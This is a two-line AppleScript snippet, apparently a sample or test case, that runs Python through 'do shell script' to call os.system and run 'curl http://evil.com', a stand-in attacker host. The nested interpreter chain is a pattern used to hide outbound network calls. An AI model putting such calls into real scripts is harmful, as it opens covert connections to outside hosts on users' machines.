-- Run Python from AppleScript to launch shell command
do shell script "python3 -c 'import os; os.system(\"curl http://evil.com\")'"
